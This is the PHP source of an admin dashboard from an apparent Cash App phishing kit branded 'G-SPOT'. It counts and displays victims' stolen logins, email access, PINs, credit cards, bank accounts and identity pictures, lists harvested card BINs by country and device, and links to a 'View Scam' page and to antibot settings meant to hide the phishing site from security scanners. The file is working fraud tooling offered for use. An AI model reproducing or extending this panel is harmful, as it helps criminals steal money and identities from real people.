<?php 
session_start();
include '../main.php';
?>
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta content="width=device-width, initial-scale=1, maximum-scale=1, shrink-to-fit=no" name="viewport">
  <title>G-SPOT - Dashboard</title>

  <!-- General CSS Files -->
  <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css">
  <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.2/css/all.css">

  <!-- Template CSS -->
  <link rel="stylesheet" href="css/style.css">
  <link rel="stylesheet" href="css/components.css">
  <script src="https://code.iconify.design/1/1.0.7/iconify.min.js"></script>
</head>

<body>
  <div id="app">
    <div class="main-wrapper">
    <div class="navbar-bg"></div>
      <nav class="navbar navbar-expand-lg main-navbar">
        <div class="mr-auto">
          <ul class="navbar-nav mr-3">
            <li><a href="#" data-toggle="sidebar" class="nav-link nav-link-lg"><i class="fas fa-bars"></i></a></li>
          </ul>
        </div>
        <ul class="navbar-nav navbar-right ml-auto">
          <li class="dropdown"><a href="#" data-toggle="dropdown" class="nav-link dropdown-toggle nav-link-lg nav-link-user">
            <div class="d-sm-none d-lg-inline-block">G-SPOT</div></a>
            <div class="dropdown-menu dropdown-menu-right">
            <a href="https://<?php echo $_SERVER['SERVER_NAME']; ?>/?<?= $param ?>" class="dropdown-item has-icon">
                <i class="fas fa-user"></i> Go to G-SPOT panel
              </a>
              <a href="https://<?php echo $_SERVER['SERVER_NAME']; ?>/?<?= $param ?>" class="dropdown-item has-icon">
                <i class="fas fa-user-lock"></i> View Scam
              </a>
            <!--  <a href="logout.php" class="dropdown-item has-icon">
                <i class="fas fa-sign-out-alt"></i> Logout
              </a> -->
            </div>
          </li>
        </ul>
      </nav>
      <div class="main-sidebar">
        <aside id="sidebar-wrapper">
          <div class="sidebar-brand">
            <a href="https://<?php echo $_SERVER['SERVER_NAME']; ?>/" style="color: #000000;"><i class="iconify" data-icon="simple-icons:cashapp"></i> G-SPOT.Inc</a>
          </div>
          <div class="sidebar-brand sidebar-brand-sm">
            <a href="https://<?php echo $_SERVER['SERVER_NAME']; ?>"><i class="iconify" data-icon="simple-icons:cashapp"></i></a>
          </div>
          <ul class="sidebar-menu">
              <li><a class="nav-link" href="https://<?php echo $_SERVER['SERVER_NAME']; ?>/panel"><i class="fas fa-home"></i> <span>Dashboard</span></a></li>
              <li><a class="nav-link" href="settings.php"><i class="fas fa-cogs"></i> <span>Settings</span></a></li>
              <li><a class="nav-link" href="killbot.php"><i class="fas fa-robot"></i> <span>Antibot Setting</span></a></li>
              <li><a class="nav-link" href="bot.php"><i class="fas fa-bug"></i> <span>Bot Detect</span></a></li>
              <li><a class="nav-link" href="reset.php"><i class="fas fa-trash-alt"></i> <span>Reset Logs</span></a></li>
            </ul>
        </aside>
      </div>
      <!-- Main Content -->
      <div class="main-content">
        <section class="section">
          <div class="section-header">
            <h1>Dashboard</h1>
          </div>
          <div class="row">
            <div class="col-md-6">
              <div class="card card-statistic-1">
                <div class="card-icon bg-primary">
                  <i class="fas iconify text-success" data-icon="simple-icons:cashapp"></i>
                </div>
                <center><div class="card-wrap">
                  <div class="card-header">
                    <h4>WELCOME TO</h4>
                  </div>
                  <div data-icon="simple-icons:cashapp">
                    <script language="JavaScript1.2">
var message=" G - S P O T . I n c"
var neonbasecolor="black"
var neontextcolor="gold"
var neontextcolor2="lime"
var neontexsize="8"
var flashspeed=50 
var flashingletters=2 
var flashingletters2=15 
var flashpause=0  
///No need to edit below this line/////
var n=0
if (document.all||document.getElementById){
document.write('<b>')
document.write('<font color="'+neonbasecolor+neontexsize+'">')
for (m=0;m<message.length;m++)
document.write('<span id="neonlight'+m+'">'+message.charAt(m)+'</span>')
document.write('</font>')
document.write('</b>')
}
else
document.write(message)
function crossref(number){
var crossobj=document.all? eval("document.all.neonlight"+number) : document.getElementById("neonlight"+number)
return crossobj
}
function neon(){
//Change all letters to base color
if (n==0){
for (m=0;m<message.length;m++)
crossref(m).style.color=neonbasecolor
}
//cycle through and change individual letters to neon color
crossref(n).style.color=neontextcolor
if (n>flashingletters-1) crossref(n-flashingletters).style.color=neontextcolor2
if (n>(flashingletters+flashingletters2)-1) crossref(n-flashingletters-flashingletters2).style.color=neonbasecolor
if (n<message.length-1)
n++
else{
n=0
clearInterval(flashing)
setTimeout("beginneon()",flashpause)
return
}
}
function beginneon(){
if (document.all||document.getElementById)
flashing=setInterval("neon()",flashspeed)
}
beginneon()
</script>
<p>Cash App v1.0</p>
                  </div>
                </div></center>
              </div>
            </div>
          </div>
          <div class="row">
            <div class="col-md-4">
              <div class="card card-statistic-1">
                <div class="card-icon bg-primary">
                  <i class="fas fa-sign-in-alt text-success"></i>
                </div>
                <div class="card-wrap">
                  <div class="card-header">
                    <h4>LOGIN</h4>
                  </div>
                  <div class="card-body">
                   <?php echo empty(@file_get_contents("../result/total_login.txt")) ? "0" : @file_get_contents("../result/total_login.txt"); ?>
                  </div>
                </div>
              </div>
            </div>
			            <div class="col-md-4">
              <div class="card card-statistic-1">
                <div class="card-icon bg-primary">
                  <i class="fas fa-envelope text-danger"></i>
                </div>
                <div class="card-wrap">
                  <div class="card-header">
                    <h4>EMAIL ACCESS</h4>
                  </div>
                  <div class="card-body">
                    <?php echo empty(@file_get_contents("../result/total_email.txt")) ? "0" : @file_get_contents("../result/total_email.txt"); ?>
                  </div>
                </div>
              </div>
            </div>
			            <div class="col-md-4">
              <div class="card card-statistic-1">
                <div class="card-icon bg-primary">
                 <i class="fas fa-key text-light"></i>
                </div>
                <div class="card-wrap">
                  <div class="card-header">
                    <h4>PIN</h4>
                  </div>
                  <div class="card-body">
                    <?php echo empty(@file_get_contents("../result/total_pin.txt")) ? "0" : @file_get_contents("../result/total_pin.txt"); ?>
                  </div>
                </div>
              </div>
            </div>
            <div class="col-md-4">
              <div class="card card-statistic-1">
                <div class="card-icon bg-primary">
                  <i class="fas fa-credit-card text-warning"></i>
                </div>
                <div class="card-wrap">
                  <div class="card-header">
                    <h4>CREDIT CARD</h4>
                  </div>
                  <div class="card-body">
                    <?php echo empty(@file_get_contents("../result/total_cc.txt")) ? "0" : @file_get_contents("../result/total_cc.txt"); ?>
                  </div>
                </div>
              </div>
            </div>
            <div class="col-md-4">
              <div class="card card-statistic-1">
                <div class="card-icon bg-primary">
                  <i class="fas fa-university text-muted"></i></i>
                </div>
                <div class="card-wrap">
                  <div class="card-header">
                    <h4>BANK ACCOUNT</h4>
                  </div>
                  <div class="card-body">
                    <?php echo empty(@file_get_contents("../result/total_bank.txt")) ? "0" : @file_get_contents("../result/total_bank.txt"); ?>
                  </div>
                </div>
              </div>
            </div>
			            <div class="col-md-4">
              <div class="card card-statistic-1">
                <div class="card-icon bg-primary">
                  <i class="fas fa-id-card text-muted"></i></i>
                </div>
                <div class="card-wrap">
                  <div class="card-header">
                    <h4>Identity Picture</h4>
                  </div>
                  <div class="card-body">
                    <?php echo empty(@file_get_contents("../result/total_identity.txt")) ? "0" : @file_get_contents("../result/total_identity.txt"); ?>
                  </div>
                </div>
              </div>
            </div>
          </div>
        <div class="section-body">
            <div class="row">
                <div class="col-md-12">
                <div class="card">
                  <div class="card-header bg-primary">
                    <h4 class="text-white"><strong>BIN LOGS ( <font style="color:red;display:inline-block;"><?php echo empty(@file_get_contents("../result/total_cc.txt")) ? "0" : @file_get_contents("../result/total_cc.txt"); ?></font> )</strong></h4>
                  </div>
                  <div class="card-body">
                    <table class="table table-bordered table-striped table-hover">
                      <tr>
<th>Country</th>
                                                <th>BIN</th>
                                                <th>Device</th>
                      </tr>
                      <tbody>
                    <?php
if(file_exists("../result/total_bin.txt")){
                                            $bin = file_get_contents("../result/total_bin.txt");
                                            $bin = explode("\n", $bin);
                                            $counny = count($bin);
                                            foreach($bin as $bins) {
                                                $bins = explode("|", $bins);
                                                $name = $bins[0];
                                                $code = $bins[1];
                                                $country = $bins[2];
                                                $device = $bins[3];
                                                if($name == "") {

                                                }else{
                                                echo "<tr>
                                                <td><img src='https://www.countryflags.io/".$code."/flat/16.png'> ".$country."</td>
                                                <td>".$name."</td>
                                                <td>".$device."</td>
                                                </tr>";
                          }
                        } 
                      } else {
                          echo "<tr><td>Not found</td><td></td><td></td><td></td><td></td></tr>";
                        }
                    ?>
                  </tbody>

                    </table>
                  </div>
                </div>
              </div>
        </section>
        
      </div>
      	<footer class="main-footer">
        <div class="text-center text-dark"><p>きみ の こと が すき だから</p></div>
    </footer>
    </div>
  </div>

  <!-- General JS Scripts -->
  <script src="https://code.jquery.com/jquery-3.3.1.min.js"></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.7/umd/popper.min.js"></script>
  <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/js/bootstrap.min.js"></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.nicescroll/3.7.6/jquery.nicescroll.min.js"></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/moment.js/2.24.0/moment.min.js"></script>
  <script src="js/stisla.js"></script>

  <!-- Template JS File -->
  <script src="js/scripts.js"></script>
  <script src="js/custom.js"></script>

</body>
</html>